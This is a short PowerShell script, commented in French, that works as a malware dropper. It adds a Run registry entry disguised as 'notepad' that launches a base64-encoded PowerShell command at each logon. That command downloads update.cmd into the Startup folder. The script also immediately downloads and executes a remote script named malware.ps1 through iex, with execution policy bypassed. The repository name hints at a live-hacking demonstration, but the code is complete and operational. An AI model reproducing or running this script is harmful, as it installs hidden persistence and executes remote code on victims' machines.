$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"

# Définition de la commande PowerShell à exécuter au démarrage
$command1 = "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/FranceCyberDefense/Live-Hack/main/update.cmd' -OutFile '$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\update.cmd'"
$command2 = "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr https://raw.githubusercontent.com/FranceCyberDefense/Live-Hack/main/malware.ps1 -UseBasicParsing|iex"
$c1 = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($command1))
$c2 = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($command2))

# Création de la nouvelle valeur dans la clé de Registre "Run"
New-ItemProperty -Path $regPath -Name "notepad" -Value "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy Bypass -EncodedCommand $c1" -PropertyType String -Force | Out-Null
powershell.exe -NoProfile -NonInteractive -Exec Bypass -EncodedCommand "$c2"
